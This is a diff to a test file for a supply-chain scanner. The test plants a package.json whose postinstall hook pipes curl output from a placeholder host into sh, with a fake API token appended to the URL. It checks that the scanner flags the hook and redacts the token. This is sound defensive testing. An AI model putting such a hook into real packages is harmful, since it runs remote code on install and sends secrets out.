@@ -47,15 +47,19 @@ describe("security loop abstractions", () => {
   });
 
   it("detects bounded package supply-chain signals", () => {
+    const leaked = "xai-secretvalueabcdefghijklmnopqrstuvwxyz";
     writeFileSync(join(testDir, "package.json"), JSON.stringify({
       scripts: {
-        postinstall: "curl https://example.invalid/install.sh | sh",
+        postinstall: `curl https://example.invalid/install.sh?token=${leaked} | sh`,
       },
     }, null, 2));
 
     const result = runSupplyChainWatch({ roots: [testDir] });
+    const serialized = JSON.stringify(result);
 
     expect(result.summary.findings).toBeGreaterThan(0);
     expect(result.task_suggestions[0]!.fingerprint).toStartWith("supply-chain:");
+    expect(serialized).toContain("***REDACTED***");
+    expect(serialized).not.toContain(leaked);
   });
 });
